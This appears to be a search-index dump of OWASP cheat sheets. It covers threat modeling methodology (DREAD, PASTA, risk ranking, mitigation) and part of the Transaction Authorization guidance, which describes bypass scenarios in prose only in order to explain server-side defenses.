Attackers. Then associate threat agents with system components they can directly interact with. Work on minimizing the number of threat agents by: Treating them as equivalent classes. Considering the attacker\u2019s motivation when evaluating likelihood. Consider insider Threats The user of this cheat can depend on the following list of risks and threat libraries sources to define the possible threats an application might be facing: Risks with OWASP Top 10 . Testing Procedure with OWASP ASVS . Risks with SANS Top 25 . Microsoft STRIDE . Map Threat agents to application Entry points \u00b6 Map threat agents to the application entry point, whether it is a login process, a registration process or whatever it might be and consider insider Threats. Draw attack vectors and attacks tree \u00b6 During this phase conduct the following activities: Draw attack vectors and attacks tree. Identify Use Cases/Abuse Cases. Re-Define attack vectors to consider multi-step attacks. Mapping Abuse Cases to Use Cases \u00b6 TODO Re-Define attack vectors \u00b6 In most cases after defining the attack vectors, the compromised user role could lead to further attacks into the application. For example, assuming that an internet banking user credentials could be compromised, the user of this cheat sheet has to then redefine the attack vectors that could result from compromising the user\u2019s credentials and so on. Write your Threat traceability matrix \u00b6 Define the Impact and Probability for each threat \u00b6 Enumerate Attacks posed by the most dangerous attacker in designated areas of the logical and physical maps of the target of evaluation. Assume the attacker has a zero-day because he does. In this methodology, we assume compromise; because a zero-day will exist or already does exist (even if we don't know about it). This is about what can be done by skilled attackers, with much more time, money, motive and opportunity that we have. Use risk management methodology to determine the risk behind the threat Create risks in risk log for every identified threat or attack to any assets. A risk assessment methodology is followed in order to identify the risk level for each vulnerability and hence for each server. Here we will highlight two risk methodology that could be used: DREAD \u00b6 DREAD , is about evaluating each existing vulnerability using a mathematical formula to retrieve the vulnerability\u2019s corresponding risk. The DREAD formula is divided into 5 main categories: D amage - how bad would an attack be? R eproducibility - how easy it is to reproduce the attack? E xploitability - how much work is it to launch the attack? A ffected users - how many people will be impacted? D iscoverability - how easy it is to discover the threat? DREAD formula is: Risk Value = (Damage + Affected users) x (Reproducibility + Exploitability + Discoverability). Then the risk level is determined using defined thresholds below. PASTA \u00b6 PASTA , Attack Simulation & Threat Analysis (PASTA) is a complete methodology to perform application threat modeling. PASTA introduces a risk-centric methodology aimed at applying security countermeasures that are commensurate to the possible impact that could be sustained from defined threat models, vulnerabilities, weaknesses, and attack patterns. PASTA introduces a complete risk analysis and evaluation procedures that you can follow to evaluate the risk for each of the identified threat. The main difference in using PASTA Approach is that you should evaluate the impact early on in the analysis phase instead of addressing the impact at the step of evaluating the risk. The idea behind addressing the impact earlier in PASTA approach is that the audience that knows impact knows the consequences on a product or use case failures more than participants in the threat analysis phase. Application security risk assessments are not enough because they are very binary and leverage a control framework basis for denoting risks. It is recommended to contextually look at threats impacts, probability and effectiveness of countermeasures that may be present. R = (T * V * P * I) / Countermeasures For more details about PASTA . Rank Risks \u00b6 Using risk matrix rank risks from most severe to least severe based on Means, Motive & Opportunity. Below is a sample risk matrix table, depending on your risk approach you can define different risk ranking matrix: Risk Value: 01 to 12 \u2192 Risk Level: Notice Risk Value: 13 to 18 \u2192 Risk Level: Low Risk Value: 19 to 36 \u2192 Risk Level: Medium Risk Value: 37 to 54 \u2192 Risk Level: High Determine countermeasures and mitigation \u00b6 Identify risk owners and agree on risk mitigation with risk owners and stakeholders. Provide the needed controls in forms of code upgrades and configuration updates to reduce risks to acceptable levels. Identify risk owners \u00b6 For the assessors: After defining and analyzing the risks, the assessor should be working on the mitigation plan by firstly identifying risk owners which is the personnel that is responsible for mitigating the risk. i.e. one of the information security team or the development team. For the designers or the architects: they should assign the risk mitigation to the development team to consider it while building the application. Agree on risk mitigation with risk owners and stakeholders \u00b6 TODO Build your risk treatment strategy \u00b6 Reduce: building controls if the form of code upgrades, confirming a specific design for the application or building a specific configuration during the deployment phase to make sure that application risk is reduced. Transfer: For a specific component in the application the risk can be transferred to an outsourced third party to develop that component and making sure that the third party is doing the right testing for the component; or during the deployment phase, outsourcing a third party to do the deployment and transferring that risk to that third party. Avoid: an example of avoiding the risk is disabling a specific function in the application that is the source for that risk. Accept: if the risk is within acceptable criteria set earlier, in that case, the designer risk owner can accept that risk. For the assessor, this is considered as the last step in the assessment process. The following steps should be conducted by the risk owner, however, the assessor shall engage in 6.5 (Testing risk treatment) to verify the remediation. Select appropriate controls to mitigate the risk \u00b6 Selecting one of the controls to reduce the risk, either by upgrading the code, or building a specific configuration during the deployment phase and so on. Test risk treatment to verify remediation \u00b6 Mitigation controls will not vanish the risk completely, rather, it would just reduce the risk. In this case, the user of this cheat sheet should measure the value of the risk after applying the mitigation controls. The value of the risk should be reduced to the acceptable criteria set earlier. Reduce risk in risk log for verified treated risk \u00b6 After applying the mitigation and measuring the new risk value, the user of this cheat sheet should update the risk log to verify that risk has been reduced. Periodically retest risk \u00b6 TODO Appendix \u00b6 TODO: Sample Design for Implementation View in 4+1 Model TODO: Sample Design for Implementation View in 4+1 Model","title":"Threat Modeling"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#threat-modeling-cheat-sheet","text":"","title":"Threat Modeling Cheat Sheet"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#introduction","text":"Threat modeling is a structured approach of identifying and prioritizing potential threats to a system, and determining the value that potential mitigations would have in reducing or neutralizing those threats. This cheat sheet aims to provide guidance on how to create threat models for both existing systems or applications as well as new systems. You do not need to be a security expert in order to implement the techniques covered in this cheat sheet. All developers, software and system designers, and architects should strive to include threat modeling in their software development life cycle. Optimally, you will create your threat models and determine which mitigations are needed during an early stage of the development of a new system, application, or feature. Assessing potential threats during the design phase of your project can save significant resources that might be needed to refactor the project to include risk mitigations during a later phase of the project. When you produce a threat model, you will: Document how data flows through a system to identify where the system might be attacked. Document as many potential threats to the system as possible. Document security controls that may be put in place to reduce the likelihood or impact of a potential threat. Note that throughout the document, the terms \"systems\" and \"applications\" are used interchangeably. The principles in the document apply equally to designing and building systems such as network infrastructures or server clusters as they do to designing or developing desktop, mobile, or web applications.","title":"Introduction"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#threat-modeling-terminology","text":"You should be familiar with the following terms that will be used throughout this cheat sheet. A threat agent is an individual or group that is capable of carrying out a particular threat. It is fundamental to identify who would want to exploit the assets of a company, how they might use them against the company, and if they would be capable of doing so. Some threats require more expertise or resources, and thus raise the level of threat actor needed. For example, if a threat requires hundreds of thousands of dollars of computing power to implement, it is likely that only organized corporate, criminal, or government actors would be valid threat actors for such a threat. However, with the rise of cloud computing and the prevalence of attack software on the internet, other threats may be easy to implement with relatively little skill and few resources. Impact is a measure of the potential damage caused by a particular threat. Impact and damage can take a variety of forms. A threat may result in damage to physical assets, or may result in obvious financial loss. Indirect loss may also result from an attack, and needs to be considered as part of the impact. For example, if your company's website were defaced this could cause damage to your company's reputation, which may in turn cause a loss of business because of the loss of confidence by your users. Depending on the business you are in, attacks that expose user information could potentially result in a physical threat of harm or loss of life to your users, greatly raising the impact of threats that would allow such exposure. Likelihood is a measure of the possibility of a threat being carried out. A variety of factors can impact the likelihood of a threat being carried out, including how difficult the implementation of the threat is, and how rewarding it would be to the attacker. For example, if a threat required a skilled threat actor with tens of thousands of dollars of computing resources to implement, and the only reward was that they were able to gain access to information that is already public in some other form, the likelihood is low. However, if the threat is relatively easy to accomplish, or if the attacker were to gain valuable information from which they could profit, the likelihood may be higher. Controls are safeguards or countermeasures that you put in place in order to avoid, detect, counteract, or minimize potential threats against your information, systems, or other assets. Preventions are controls that may completely prevent a particular attack from being possible. For example, if you identify a threat that your users' personal information may be identified by certain application logging, and you decide to completely remove that logging, you have prevented that particular threat. Mitigations are controls that are put in place to reduce either the likelihood or the impact of a threat, while not necessarily completely preventing it. For example, if you store your user's passwords as hashes in a database, two users who have the same password will have the same hash. Thus, if an attacker has access to the hashed passwords and is able to determine the password associated with one hash, he is easily able to find all the other users who share the same password simply by looking for the same hash. However, if you add salts to each user's password , the cost of this particular attack is greatly increased, as the attacker must crack each password individual. An increase in cost reduces the likelihood, and thus has mitigated the attack. A data flow diagram is a depiction of how information flows through your system. It shows each place that data is input into or output from each process or subsystem. It includes anywhere that data is stored in the system, either temporarily or long-term. A trust boundary (in the context of threat modeling) is a location on the data flow diagram where data changes its level of trust. Any place where data is passed between two processes is typically a trust boundary. If your application reads a file from disk, there's a trust boundary between the application and the file because outside processes and users can modify the data in the file. If your application makes a call to a remote process, or a remote process makes calls to your application, that's a trust boundary. If you read data from a database, there's typically a trust boundary because other processes can modify the data in the database. Any place you accept user input in any form is always a trust boundary.","title":"Threat Modeling Terminology"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#getting-started","text":"","title":"Getting Started"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-business-objectives","text":"Before starting the threat modeling process it is important to identify business objectives of the applications you are assessing, and to identify security and compliance requirements that may be necessary due to business or government regulation. Having these objectives and requirements in mind before the threat assessment begins will help you to evaluate the impact of any threat you find during the risk analysis process.","title":"Define Business Objectives"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#identify-application-design","text":"Early in the threat modeling process, you will need to draw a data flow diagram of the entire system that is being assessed, including its trust boundaries. Thus, understanding the design of the application is key to performing threat modeling. Even if you are very familiar with the application design, you may identify additional data flows and trust boundaries throughout the threat modeling process. A thorough understanding of how the system is designed will also help you assess the likelihood and potential impact of any particular threat that you identify. When you are assessing an existing system that has existing design documentation, spend time reviewing that documentation. The documentation may be out of date, requiring you to gather new information to update the documentation. Or, there may be not documentation at all, requiring you to create the design documents. In the optimal case, you are performing your assessment during the design phase of the project, and the design documentation will be up-to-date and available. In any event, this cheat sheet outlines steps you can take to create design documents if they are needed.","title":"Identify application design"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#create-design-documents","text":"There are many ways to generate design documents; the 4+1 view model is one of the matured approaches to building your design document. Reference to 4+1 view model of architecture here . Please note that the 4+1 is comprehensive, you may use any other design model during this phase. The following subsections show the details about 4+1 approach and how this could help in the threat modeling process:","title":"Create design documents"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#logical-view","text":"Create a logical map of the Target of Evaluation. Audience : Designers. Area : Functional Requirements: describes the design's object model. Related Artifacts : Design model","title":"Logical View"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#implementation-view","text":"Audience : Programmers. Area : Software components: describes the layers and subsystems of the application. Related Artifacts : Implementation model, components Please refer to the image in the appendix section for sample design for the implementation view.","title":"Implementation View"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#process-view","text":"Audience : Integrators. Area : Non-functional requirements: describes the design's concurrency and synchronization aspects. Related Artifacts : (no specific artifact).","title":"Process View"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#deployment-view","text":"Create a physical map of the Target of Evaluation Audience : Deployment managers. Area : Topology: describes the mapping of the software onto the hardware and shows the system's distributed aspects. Related Artifacts : Deployment model.","title":"Deployment View"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#use-case-view","text":"Audience : All the stakeholders of the system, including the end users. Area : describes the set of scenarios and/or use cases that represent some significant, central functionality of the system. Related Artifacts : Use-Case Model, Use-Case documents","title":"Use-Case View"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#decompose-and-model-the-system","text":"Gain an understanding of how the system works to perform a threat model, it is important to understand how the system works and interacts with its ecosystem. To start with creating a high-level information flow diagram, like the following: Identify the trusted boundaries of your system/application/module/ecosystem that you may want to start off with. Add actors \u2013 internal and external Define internal trusted boundaries. These can be the different security zones that have been designed Relook at the actors you have identified in #2 for consistency Add information flows Identify the information elements and their classification as per your information classification policy Where possible add assets to the identified information flows.","title":"Decompose and Model the System"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-and-evaluate-your-assets","text":"Assets involved in the information flow should be defined and evaluated according to their value of confidentiality, integrity and availability.","title":"Define and Evaluate your Assets"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#consider-data-in-transit-and-data-at-rest","text":"Data protection in transit is the protection of this data while it\u2019s traveling from network to network or being transferred from a local storage device to a cloud storage device \u2013 wherever data is moving, effective data protection measures for in-transit data are critical as data is often considered less secure while in motion. While data at rest is sometimes considered to be less vulnerable than data in transit, attackers often find data at rest a more valuable target than data in motion. The risk profile for data in transit or data at rest depends on the security measures that are in place to secure data in either state. Protecting sensitive data both in transit and at rest is imperative for modern enterprises as attackers find increasingly innovative ways to compromise systems and steal data.","title":"Consider Data in transit and Data at rest"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#create-an-information-flow-diagram","text":"","title":"Create an information flow diagram"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#whiteboard-your-architecture","text":"It is important to whiteboard system architecture by showing the major constraints and decisions in order to frame and start conversations. The value is actually twofold. If the architecture cannot be white-boarded, then it suggests that it is not well understood. If a clear and concise whiteboard diagram can be provided, others will understand it and it will be easier to communicate details.","title":"Whiteboard Your Architecture"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#manage-to-present-your-dfd-in-the-context-of-mvc","text":"In this step, Data Flow Diagram should be divided in the context of Model, View, Controller (MVC).","title":"Manage to present your DFD in the context of MVC"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#use-tools-to-draw-your-diagram","text":"If you don\u2019t like to manually draw your DFD; there are several tools available that could be used:","title":"Use tools to draw your diagram"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#owasp-threat-dragon","text":"The OWASP Threat Dragon project is a cross platform tool that runs on Linux, macOS and Windows 10. Threat Dragon (TD) is used to create threat model diagrams and to record possible threats and decide on their mitigations using STRIDE methodology. TD is both a web application and a desktop application ; in active development with version 1.1 released in March 2020.","title":"OWASP Threat Dragon"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#poirot","text":"The Poirot tool isolates and diagnoses defects through fault modeling and simulation. Along with a carefully selected partitioning strategy, functional and sequential test pattern applications show success with circuits having a high degree of observability.","title":"Poirot"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#ms-tmt","text":"The Microsoft Threat Modeling Tool (TMT) helps find threats in the design phase of software projects. It is one of the longest lived threat modeling tools, having been introduced as Microsoft SDL in 2008, and is actively supported; version 7.3 was released March 2020. It runs only on Windows 10 Anniversary Update or later, and so is difficult to use on macOS or Linux.","title":"MS TMT"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-data-flow-over-your-dfd","text":"Define Data Flows over the organization Data Flow Diagram.","title":"Define Data Flow over your DFD"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-trust-boundaries","text":"Define any distinct boundaries (External boundaries and Internal boundaries) within which a system trusts all sub-systems (including data).","title":"Define Trust Boundaries"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-applications-user-roles-and-trust-levels","text":"Define access rights that the application will grant to external entities and internal entities.","title":"Define applications user roles and trust levels"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#highlight-authorization-per-user-role-over-the-dfd","text":"Highlight Authorization per user role, for example, defining app users\u2019 role, admins\u2019 role, anonymous visitors\u2019 role...etc.","title":"Highlight Authorization per user role over the DFD"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-application-entry-points","text":"Define the interfaces through which potential attackers can interact with the application or supply them with data.","title":"Define Application Entry points"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#identify-threat-agents","text":"","title":"Identify Threat Agents"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-all-possible-threats","text":"Identify Possible Attackers threat agents that could exist within the Target of Evaluation. Use Means, Motive, and Opportunities to understand Threats posed by Attackers. Then associate threat agents with system components they can directly interact with. Work on minimizing the number of threat agents by: Treating them as equivalent classes. Considering the attacker\u2019s motivation when evaluating likelihood. Consider insider Threats The user of this cheat can depend on the following list of risks and threat libraries sources to define the possible threats an application might be facing: Risks with OWASP Top 10 . Testing Procedure with OWASP ASVS . Risks with SANS Top 25 . Microsoft STRIDE .","title":"Define all possible threats"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#map-threat-agents-to-application-entry-points","text":"Map threat agents to the application entry point, whether it is a login process, a registration process or whatever it might be and consider insider Threats.","title":"Map Threat agents to application Entry points"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#draw-attack-vectors-and-attacks-tree","text":"During this phase conduct the following activities: Draw attack vectors and attacks tree. Identify Use Cases/Abuse Cases. Re-Define attack vectors to consider multi-step attacks.","title":"Draw attack vectors and attacks tree"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#mapping-abuse-cases-to-use-cases","text":"TODO","title":"Mapping Abuse Cases to Use Cases"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#re-define-attack-vectors","text":"In most cases after defining the attack vectors, the compromised user role could lead to further attacks into the application. For example, assuming that an internet banking user credentials could be compromised, the user of this cheat sheet has to then redefine the attack vectors that could result from compromising the user\u2019s credentials and so on.","title":"Re-Define attack vectors"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#write-your-threat-traceability-matrix","text":"","title":"Write your Threat traceability matrix"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#define-the-impact-and-probability-for-each-threat","text":"Enumerate Attacks posed by the most dangerous attacker in designated areas of the logical and physical maps of the target of evaluation. Assume the attacker has a zero-day because he does. In this methodology, we assume compromise; because a zero-day will exist or already does exist (even if we don't know about it). This is about what can be done by skilled attackers, with much more time, money, motive and opportunity that we have. Use risk management methodology to determine the risk behind the threat Create risks in risk log for every identified threat or attack to any assets. A risk assessment methodology is followed in order to identify the risk level for each vulnerability and hence for each server. Here we will highlight two risk methodology that could be used:","title":"Define the Impact and Probability for each threat"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#dread","text":"DREAD , is about evaluating each existing vulnerability using a mathematical formula to retrieve the vulnerability\u2019s corresponding risk. The DREAD formula is divided into 5 main categories: D amage - how bad would an attack be? R eproducibility - how easy it is to reproduce the attack? E xploitability - how much work is it to launch the attack? A ffected users - how many people will be impacted? D iscoverability - how easy it is to discover the threat? DREAD formula is: Risk Value = (Damage + Affected users) x (Reproducibility + Exploitability + Discoverability). Then the risk level is determined using defined thresholds below.","title":"DREAD"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#pasta","text":"PASTA , Attack Simulation & Threat Analysis (PASTA) is a complete methodology to perform application threat modeling. PASTA introduces a risk-centric methodology aimed at applying security countermeasures that are commensurate to the possible impact that could be sustained from defined threat models, vulnerabilities, weaknesses, and attack patterns. PASTA introduces a complete risk analysis and evaluation procedures that you can follow to evaluate the risk for each of the identified threat. The main difference in using PASTA Approach is that you should evaluate the impact early on in the analysis phase instead of addressing the impact at the step of evaluating the risk. The idea behind addressing the impact earlier in PASTA approach is that the audience that knows impact knows the consequences on a product or use case failures more than participants in the threat analysis phase. Application security risk assessments are not enough because they are very binary and leverage a control framework basis for denoting risks. It is recommended to contextually look at threats impacts, probability and effectiveness of countermeasures that may be present. R = (T * V * P * I) / Countermeasures For more details about PASTA .","title":"PASTA"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#rank-risks","text":"Using risk matrix rank risks from most severe to least severe based on Means, Motive & Opportunity. Below is a sample risk matrix table, depending on your risk approach you can define different risk ranking matrix: Risk Value: 01 to 12 \u2192 Risk Level: Notice Risk Value: 13 to 18 \u2192 Risk Level: Low Risk Value: 19 to 36 \u2192 Risk Level: Medium Risk Value: 37 to 54 \u2192 Risk Level: High","title":"Rank Risks"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#determine-countermeasures-and-mitigation","text":"Identify risk owners and agree on risk mitigation with risk owners and stakeholders. Provide the needed controls in forms of code upgrades and configuration updates to reduce risks to acceptable levels.","title":"Determine countermeasures and mitigation"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#identify-risk-owners","text":"For the assessors: After defining and analyzing the risks, the assessor should be working on the mitigation plan by firstly identifying risk owners which is the personnel that is responsible for mitigating the risk. i.e. one of the information security team or the development team. For the designers or the architects: they should assign the risk mitigation to the development team to consider it while building the application.","title":"Identify risk owners"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#agree-on-risk-mitigation-with-risk-owners-and-stakeholders","text":"TODO","title":"Agree on risk mitigation with risk owners and stakeholders"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#build-your-risk-treatment-strategy","text":"Reduce: building controls if the form of code upgrades, confirming a specific design for the application or building a specific configuration during the deployment phase to make sure that application risk is reduced. Transfer: For a specific component in the application the risk can be transferred to an outsourced third party to develop that component and making sure that the third party is doing the right testing for the component; or during the deployment phase, outsourcing a third party to do the deployment and transferring that risk to that third party. Avoid: an example of avoiding the risk is disabling a specific function in the application that is the source for that risk. Accept: if the risk is within acceptable criteria set earlier, in that case, the designer risk owner can accept that risk. For the assessor, this is considered as the last step in the assessment process. The following steps should be conducted by the risk owner, however, the assessor shall engage in 6.5 (Testing risk treatment) to verify the remediation.","title":"Build your risk treatment strategy"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#select-appropriate-controls-to-mitigate-the-risk","text":"Selecting one of the controls to reduce the risk, either by upgrading the code, or building a specific configuration during the deployment phase and so on.","title":"Select appropriate controls to mitigate the risk"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#test-risk-treatment-to-verify-remediation","text":"Mitigation controls will not vanish the risk completely, rather, it would just reduce the risk. In this case, the user of this cheat sheet should measure the value of the risk after applying the mitigation controls. The value of the risk should be reduced to the acceptable criteria set earlier.","title":"Test risk treatment to verify remediation"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#reduce-risk-in-risk-log-for-verified-treated-risk","text":"After applying the mitigation and measuring the new risk value, the user of this cheat sheet should update the risk log to verify that risk has been reduced.","title":"Reduce risk in risk log for verified treated risk"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#periodically-retest-risk","text":"TODO","title":"Periodically retest risk"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html#appendix","text":"TODO: Sample Design for Implementation View in 4+1 Model TODO: Sample Design for Implementation View in 4+1 Model","title":"Appendix"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html","text":"Transaction Authorization Cheat Sheet \u00b6 Purpose and audience \u00b6 The Purpose of this cheat sheet is to provide guidelines on how to securely implement transaction authorization to protect it from being bypassed. These guidelines can be used by: Banks - to define functional and non-functional requirements for transaction authorization. Developers \u2013 to design and implement transaction authorization without vulnerabilities. Pentesters \u2013 to test for transaction authorization security. Introduction \u00b6 Some applications use a second factor to check whether an authorized user is performing sensitive operations. A common example is wire transfer authorization, typically used in online or mobile banking applications. For the purpose of this document we will call that process: transaction authorization . Usage scenarios are not only limited to financial systems. For example: an email with a secret code or a link with some kind of token to unlock a user account is also a special case of transaction authorization. A user authorizes the operation of account unlocking by using a second factor (a unique code sent to his email address). Transaction authorization can be implemented using various methods, e.g.: Cards with transaction authorization numbers (TAN), Time based OTP tokens, such as OATH TOTP (Time-based One-Time Password) , OTP sent by SMS or provided by phone Digital signature using e.g. a smart card or a smart phone, Challenge-response tokens, including unconnected card readers or solutions which scan transaction data from the user's computer screen. Some of these can be implemented on a physical device or in a mobile application. Transaction authorization is implemented in order to protect for unauthorized wire transfers as a result of attacks using malware, phishing, password or session hijacking, CSRF, XSS, etc.. Unfortunately, as with any piece of code, this protection can be improperly implemented and as a result it might be possible to bypass this safeguard. 1. Functional Guidelines \u00b6 1.1 Transaction authorization method has to allow a user to identify and acknowledge significant transaction data \u00b6 User's computers cannot be trusted due to malware threats. Hence a method that prevents a user from identifying transaction on an external device cannot be considered as secure. Transaction data should be presented and acknowledged using an external authorization component. Such a transaction authorization components should be build using the What You See Is What You Sign principle. When a user authorizes a transaction he needs to know what he is authorizing. Based on this principle, an authorization method must permit a user to identify and acknowledge the data which are significant to a given transaction. For example, in the case of a wire transfer: the target account and amount. The decision about which transaction data can be considered as significant should be chosen based on: The real risk, The technical capabilities and constraints of the chosen authorization method, Positive user experience. For example when an SMS message is used to send significant transaction data, it is possible to send the target account, amount and type of transfer. However, for an unconnected CAP reader it is perceived to be inconvenient for a user to enter these data. In such cases, entering only the most significant transaction data (e.g. partial target account number and amount) can be considered sufficient. In general, significant transaction data should always be presented as an inherent part of the transaction authorization process. Whereas the user experience should be designed to encourage users to verify the transaction data. If a transaction authentication process requires a user to enter transaction data into an external device, the user should be prompted for providing specific value (e.g. a target account number). Entering a value without meaningful prompt could be easily abused by malware using social engineering techniques as described in the example in paragraph 1.4. Also, for more detailed discussion of input overloading problems, see here . 1.2 Change of authorization token should be authorized using the current authorization token \u00b6 When a user is allowed to change authorization token by using the application interface, the operation should be authorized by using his current authorization credentials (as is the case with password change procedure ). For example: when a user changes a phone number for SMS codes an authorization SMS code should be sent to the current phone number. 1.3 Change of authorization method should be authorized using the current authorization method \u00b6 Some applications allow a user to chose between multiple methods of transaction authorization. In such cases, the user should authorize the change in authorization method using his current authorization method. Otherwise, malware may change the authorization method to the most vulnerable method. Additionally, the application should inform the user about the potential dangers associated to the selected authorization method. 1.4 Users should be able to easily distinguish the authentication process from the transaction authorization process \u00b6 Malware can trick users in authorizing fraudulent operations, when an application requires a user to perform the same actions for authentication as for transaction authorization. Consider the following example: An application is using the same method for user authentication (usually as a second factor to traditional login/password) and for transaction authorization. E.g. by using a OTP token, Challenge-response codes, operation signing using external smartcard, ... A malware may present the user a false error message after the first step (authentication to the application) and trick the user into repeating the authentication procedure. The first authentication code will be used by the malware for authentication, whereas the second code would be used to authorize a fraudulent transaction. Even challenge-response schemes could be abused using this scenario as malware can present a challenge taken from a fraudulent transaction and trick the user to provide response. Such an attack scenario is used widely in malware attacks against electronic banking . In the abovementioned scenario, the same method was used to authenticate the user and to authorize the transaction. Malware can abuse this behavior to extract transaction authorization credentials without the user's knowledge. Social engineering methods can be used despite utilized authentication and operation authorization methods but the application shouldn't simplify such attack scenarios. Safeguards should allow the user to easily distinguish authentication from transaction authorization. This could be achieved by: Using different methods to authenticate and to authorize, Or using different actions in an external security component (e.g. different mode of operation in CAP reader), Or presenting the user a clear message about what they are \"signing\" (What You See Is What You Sign Principle). 1.5 Each transaction should be authorized using unique authorization credentials \u00b6 Some applications are asking for transaction authorization credentials only once, e.g. static password, code sent through SMS, token response. Afterwards a user is able to authorize any transaction during the whole user's session or at least he has to reuse the same credentials each time he needs to authorize a transaction. Such behavior is not sufficient to prevent malware attacks because malware will sniff such credentials and use them to authorize any transaction without the user's knowledge. 2. Non-functional guidelines \u00b6 2.1 Authorization should be performed and enforced server-side \u00b6 As for all other security controls transaction authorization should be enforced server-side. By no means it should be possible to influence the authorization result by altering data which flows from a client to a server, e.g. by: Tampering with parameters that contain transaction data, Adding/removing parameters which will disable authorization check, Causing an error. To achieve this, security programming best practices should be applied, such as: Default deny . Avoiding debugging functionality in production code. To avoid tampering, additional safeguards should be considered. For example by cryptographically protecting the data for confidentiality and integrity and while decrypting and verifying the data server side. 2.2 Authorization method should be enforced server side \u00b6 When multiple transaction authorization methods are available to the user. The server should enforce the use of the current authorization method chosen by the user in the application settings or enforced by application policies. It should be impossible to change an authorization method by manipulating the parameters provided from the client. Otherwise, malware can downgrade an authorization method to a less or even the least secure authorization method. This is especially important when an application is developed to add a new, more secure authorization method. It is not very rare,that a new authorization method is built on top of an old codebase. As a result, when a client is sending parameters using the old method, the transaction may be authorized, despite the fact that the user has already switched to a new method. 2.3 Transaction verification data should be generated server-side \u00b6 When significant transaction data are transmitted programmatically to an authorization component, extra care should be put into denying client modifications on the transaction data at authorization. Significant transaction data that has to be verified by the user, should be generated and stored on a server, then passed to an authorization component without any possibility of tampering by the client. A common anti pattern is to collect significant transaction data client-side and pass it to the server. In such cases, malware can manipulate these data and as a result, show faked transaction data in an authorization component. 2.4 Application should prevent authorization credentials brute-forcing \u00b6 When transaction authorization credentials are sent to the server for verification, an application has to prevent brute-forcing. The transaction authorization process must be restarted after number of failed authorization attempts. In addition other anti brute-forcing and anti-automation techniques should be considered to prevent an attacker from automating his attacks,see OWASP Authentication Cheat Sheet . 2.5 Application should control which transaction state transitions are allowed \u00b6 Transaction authorization is usually performed in multiple steps, e.g.: The user enters the transaction data. The user requests authorization. The application initializes an authorization mechanism. The user verifies/confirms the transaction data. The user responds with the authorization credentials. The application validates authorization and executes a transaction. An application should process such business logic flow in sequential step order and preventing a user from performing these steps out of order or in even skipping any of these steps (see OWASP ASVS requirement 15.1 ). This should protect against attack techniques such as: Overwriting transaction data before user will enter the authorization credentials, Skipping transaction authorization. 2.6 Transaction data should be protected against modification \u00b6 The transaction authorization process should protect against attack scenarios that modify transaction data after the initial entry by the user. For example, a bad implementation of a transaction authorization process may allow the following attacks (for reference, see steps of transaction authorization described in paragraph 2.5): Replaying step 1 (sending transaction data) in the background and overwriting transaction details with fraudulent transaction, before the user enters authorization credentials. Adding parameters with transaction data to a HTTP request which authorizes the transaction. In such a case, poor implementation will authorize the initial transaction and then execute a fraudulent transaction (specific example of Time of Check to Time of Use vulnerability ). The protection against modification could be implemented using various techniques depending on the framework used, but one or more of the following should be present: Any modification of transaction data should trigger invalidation of any previously entered authorization data. E.g. Generated OTP or challenge is invalidated. Any modification of transaction data should trigger reset of the authorization process. Any attempts to modify transaction data after the initial entry by the user is a symptom of tinkering with an application and should be logged, monitored and carefully investigated. 2.7 Confidentiality of the transaction data should be protected during any client / server communications \u00b6 The transaction authorization process should protect the privacy of transaction data being presented to the user to authorize i.e. at section 2.5, steps 2 and 4. 2.8 When a transaction is executed, the system should check whether it was authorized \u00b6 The result of the transaction entry and the authorization process described in paragraph 2.5 is the transaction execution. Just before the transaction is executed there should be a final control gate which verifies whether the transaction was properly authorized by the user. Such control, tied to execution, should prevent attacks such as: Time of Check to Time of Use (TOCTOU) \u2013 example in paragraph 